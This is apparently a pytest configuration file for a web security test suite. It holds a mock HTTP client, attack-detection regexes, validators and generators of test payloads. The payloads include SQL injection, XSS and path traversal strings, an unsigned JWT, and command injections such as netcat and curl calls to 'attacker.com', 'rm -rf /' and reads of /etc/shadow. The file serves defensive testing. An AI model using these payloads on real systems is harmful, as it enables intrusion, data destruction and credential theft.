# -*- coding: utf-8 -*-
"""
Pytest configuration for Security Penetration Tests

Provides:
- Fixtures for security test setup
- Mock HTTP clients for testing
- Security test utilities
- Reporting infrastructure

WARNING: These tests simulate attacks. Only run in controlled test environments.

Author: GreenLang Test Engineering
Date: December 2025
"""

import pytest
import logging
import json
import hashlib
import re
import tempfile
from pathlib import Path
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from unittest.mock import MagicMock, AsyncMock

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


# ==============================================================================
# Enums and Data Classes
# ==============================================================================

class SecurityTestSeverity(Enum):
    """Severity levels for security findings."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class SecurityTestStatus(Enum):
    """Status of a security test."""
    PASSED = "passed"
    FAILED = "failed"
    SKIPPED = "skipped"
    ERROR = "error"


@dataclass
class SecurityFinding:
    """Represents a security vulnerability finding."""
    finding_id: str
    title: str
    description: str
    severity: SecurityTestSeverity
    category: str
    affected_component: str
    evidence: str
    remediation: str
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    discovered_at: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "finding_id": self.finding_id,
            "title": self.title,
            "description": self.description,
            "severity": self.severity.value,
            "category": self.category,
            "affected_component": self.affected_component,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe_id": self.cwe_id,
            "cvss_score": self.cvss_score,
            "discovered_at": self.discovered_at.isoformat(),
        }


@dataclass
class SecurityTestResult:
    """Result of a security test."""
    test_name: str
    status: SecurityTestStatus
    duration_seconds: float = 0.0
    findings: List[SecurityFinding] = field(default_factory=list)
    details: str = ""
    executed_at: datetime = field(default_factory=datetime.now)

    def add_finding(self, finding: SecurityFinding):
        """Add a finding."""
        self.findings.append(finding)
        if finding.severity in [SecurityTestSeverity.CRITICAL, SecurityTestSeverity.HIGH]:
            self.status = SecurityTestStatus.FAILED

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "test_name": self.test_name,
            "status": self.status.value,
            "duration_seconds": self.duration_seconds,
            "findings": [f.to_dict() for f in self.findings],
            "details": self.details,
            "executed_at": self.executed_at.isoformat(),
        }


# ==============================================================================
# Mock HTTP Client for Security Testing
# ==============================================================================

class MockHTTPResponse:
    """Mock HTTP response for testing."""

    def __init__(
        self,
        status_code: int = 200,
        body: Any = None,
        headers: Optional[Dict[str, str]] = None,
    ):
        self.status_code = status_code
        self.body = body or {}
        self.headers = headers or {"Content-Type": "application/json"}
        self.text = json.dumps(body) if isinstance(body, dict) else str(body)

    def json(self) -> Dict[str, Any]:
        return self.body if isinstance(self.body, dict) else {}


class SecurityTestClient:
    """HTTP client for security testing with attack payload support."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.requests_log: List[Dict[str, Any]] = []
        self.responses: Dict[str, MockHTTPResponse] = {}

    def set_response(self, path: str, response: MockHTTPResponse):
        """Set a mock response for a path."""
        self.responses[path] = response

    def get(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, str]] = None,
    ) -> MockHTTPResponse:
        """Simulate GET request."""
        return self._request("GET", path, headers, params=params)

    def post(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        json_data: Optional[Dict[str, Any]] = None,
        data: Optional[str] = None,
    ) -> MockHTTPResponse:
        """Simulate POST request."""
        return self._request("POST", path, headers, json_data=json_data, data=data)

    def put(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        json_data: Optional[Dict[str, Any]] = None,
    ) -> MockHTTPResponse:
        """Simulate PUT request."""
        return self._request("PUT", path, headers, json_data=json_data)

    def delete(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
    ) -> MockHTTPResponse:
        """Simulate DELETE request."""
        return self._request("DELETE", path, headers)

    def _request(
        self,
        method: str,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        json_data: Optional[Dict[str, Any]] = None,
        data: Optional[str] = None,
        params: Optional[Dict[str, str]] = None,
    ) -> MockHTTPResponse:
        """Make a request and log it."""
        request = {
            "method": method,
            "path": path,
            "headers": headers or {},
            "json": json_data,
            "data": data,
            "params": params,
            "timestamp": datetime.now().isoformat(),
        }
        self.requests_log.append(request)

        # Check for security issues in request
        self._detect_attack_patterns(request)

        # Return mock response or default
        if path in self.responses:
            return self.responses[path]

        return MockHTTPResponse(status_code=200, body={"status": "ok"})

    def _detect_attack_patterns(self, request: Dict[str, Any]):
        """Detect attack patterns in request (for testing purposes)."""
        attack_patterns = {
            "sql_injection": [
                r"'.*OR.*'",
                r"'.*--",
                r"UNION\s+SELECT",
                r"DROP\s+TABLE",
            ],
            "command_injection": [
                r";\s*rm\s",
                r"\|\s*cat\s",
                r"`.*`",
                r"\$\(.*\)",
            ],
            "xss": [
                r"<script>",
                r"javascript:",
                r"onerror\s*=",
                r"onclick\s*=",
            ],
            "path_traversal": [
                r"\.\./",
                r"\.\.\\",
                r"%2e%2e",
            ],
        }

        # Check all string values in request
        for key, value in request.items():
            if isinstance(value, str):
                for attack_type, patterns in attack_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, value, re.IGNORECASE):
                            logger.warning(
                                f"Potential {attack_type} detected in {key}: {value[:50]}..."
                            )


# ==============================================================================
# Security Payload Generators
# ==============================================================================

class PayloadGenerator:
    """Generate security test payloads."""

    @staticmethod
    def sql_injection_payloads() -> List[str]:
        """Generate SQL injection test payloads."""
        return [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "'; DROP TABLE users;--",
            "1'; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "1 OR 1=1",
            "' OR 'x'='x",
            "admin'--",
            "1; SELECT * FROM users",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' OR ''='",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "' HAVING 1=1--",
            "' GROUP BY columnname HAVING 1=1--",
        ]

    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Generate command injection test payloads."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "& dir",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc attacker.com 1234",
            "; curl attacker.com",
            "&& cat /etc/shadow",
            "|| id",
            "; ping -c 1 attacker.com",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            ";sleep(10)#",
            "| timeout 10 bash -c 'sleep 10'",
        ]

    @staticmethod
    def xss_payloads() -> List[str]:
        """Generate XSS test payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>click</a>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "' onclick=alert(1) '",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "#{alert(1)}",
        ]

    @staticmethod
    def path_traversal_payloads() -> List[str]:
        """Generate path traversal test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "..././..././..././etc/passwd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
        ]

    @staticmethod
    def auth_bypass_payloads() -> List[Dict[str, str]]:
        """Generate authentication bypass test payloads."""
        return [
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "", "password": ""},
            {"username": "admin", "password": "' OR 1=1--"},
            {"username": "' OR 1=1--", "password": "' OR 1=1--"},
            {"token": "null"},
            {"token": "undefined"},
            {"token": ""},
            {"jwt": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
        ]

    @staticmethod
    def sensitive_data_patterns() -> List[str]:
        """Patterns for detecting sensitive data exposure."""
        return [
            r"[A-Za-z0-9+/]{40,}={0,2}",  # Base64 encoded strings
            r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
            r"-----BEGIN CERTIFICATE-----",
            r"[a-zA-Z0-9]{32,}",  # API keys
            r"password\s*[=:]\s*['\"][^'\"]+['\"]",
            r"secret\s*[=:]\s*['\"][^'\"]+['\"]",
            r"api[_-]?key\s*[=:]\s*['\"][^'\"]+['\"]",
            r"aws_access_key_id\s*=\s*[A-Z0-9]{20}",
            r"aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}",
            r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}",  # UUIDs
        ]


# ==============================================================================
# Security Validators
# ==============================================================================

class SecurityValidator:
    """Validate security controls."""

    @staticmethod
    def check_sql_injection_vulnerability(response: MockHTTPResponse) -> bool:
        """Check if response indicates SQL injection vulnerability."""
        error_indicators = [
            "sql syntax",
            "mysql error",
            "postgresql error",
            "sqlite error",
            "oracle error",
            "unclosed quotation",
            "unterminated string",
            "you have an error in your sql",
        ]

        response_text = response.text.lower()
        for indicator in error_indicators:
            if indicator in response_text:
                return True
        return False

    @staticmethod
    def check_command_injection_vulnerability(response: MockHTTPResponse) -> bool:
        """Check if response indicates command injection vulnerability."""
        indicators = [
            "root:x:0:0",  # /etc/passwd content
            "uid=",  # id command output
            "directory of",  # Windows dir output
            "total ",  # ls output
            "permission denied",  # Command execution error
        ]

        response_text = response.text.lower()
        for indicator in indicators:
            if indicator in response_text:
                return True
        return False

    @staticmethod
    def check_xss_vulnerability(response: MockHTTPResponse) -> bool:
        """Check if response reflects XSS payload."""
        xss_patterns = [
            r"<script>",
            r"javascript:",
            r"onerror\s*=",
            r"onclick\s*=",
            r"onload\s*=",
        ]

        for pattern in xss_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False

    @staticmethod
    def check_rate_limiting(responses: List[MockHTTPResponse]) -> bool:
        """Check if rate limiting is working."""
        rate_limited = any(r.status_code == 429 for r in responses)
        return rate_limited

    @staticmethod
    def check_cors_headers(response: MockHTTPResponse) -> Dict[str, Any]:
        """Check CORS headers for security issues."""
        headers = response.headers
        issues = []

        allow_origin = headers.get("Access-Control-Allow-Origin", "")
        if allow_origin == "*":
            issues.append("Wildcard CORS origin allows any domain")

        allow_credentials = headers.get("Access-Control-Allow-Credentials", "")
        if allow_credentials == "true" and allow_origin == "*":
            issues.append("CORS with credentials and wildcard origin is dangerous")

        return {
            "secure": len(issues) == 0,
            "issues": issues,
            "headers": {
                "Access-Control-Allow-Origin": allow_origin,
                "Access-Control-Allow-Credentials": allow_credentials,
            },
        }


# ==============================================================================
# Pytest Fixtures
# ==============================================================================

@pytest.fixture
def security_client() -> SecurityTestClient:
    """Provide security test client."""
    return SecurityTestClient()


@pytest.fixture
def payload_generator() -> PayloadGenerator:
    """Provide payload generator."""
    return PayloadGenerator()


@pytest.fixture
def security_validator() -> SecurityValidator:
    """Provide security validator."""
    return SecurityValidator()


@pytest.fixture
def security_report_dir(tmp_path) -> Path:
    """Provide temporary directory for security reports."""
    report_dir = tmp_path / "security-reports"
    report_dir.mkdir()
    return report_dir


# ==============================================================================
# Pytest Configuration
# ==============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers",
        "security: mark test as a security test",
    )
    config.addinivalue_line(
        "markers",
        "auth_bypass: mark test as authentication bypass test",
    )
    config.addinivalue_line(
        "markers",
        "injection: mark test as injection test (SQL, command)",
    )
    config.addinivalue_line(
        "markers",
        "xss: mark test as cross-site scripting test",
    )
    config.addinivalue_line(
        "markers",
        "api_security: mark test as API security test",
    )
    config.addinivalue_line(
        "markers",
        "secrets: mark test as secrets exposure test",
    )


def pytest_collection_modifyitems(config, items):
    """Add security marker to all tests in this directory."""
    for item in items:
        if "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
